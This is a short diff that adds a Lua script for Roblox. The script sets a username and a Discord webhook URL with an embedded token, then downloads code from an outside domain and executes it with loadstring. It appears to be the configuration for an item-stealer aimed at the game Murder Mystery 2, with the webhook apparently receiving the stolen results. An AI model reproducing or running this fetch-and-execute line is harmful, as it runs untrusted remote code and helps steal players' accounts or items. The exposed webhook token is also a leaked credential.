@@ -1,0 +1,4 @@
+Username = "rip_TEEDYY"
+Webhook = "https://discord.com/api/webhooks/1265590437293588512/Vutp8zEFy_rMb6riVKiO-QMROOKU37UNHe9n-EOci617XUnW1qoeHjLVfKCF7qCb3FN9"
+
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
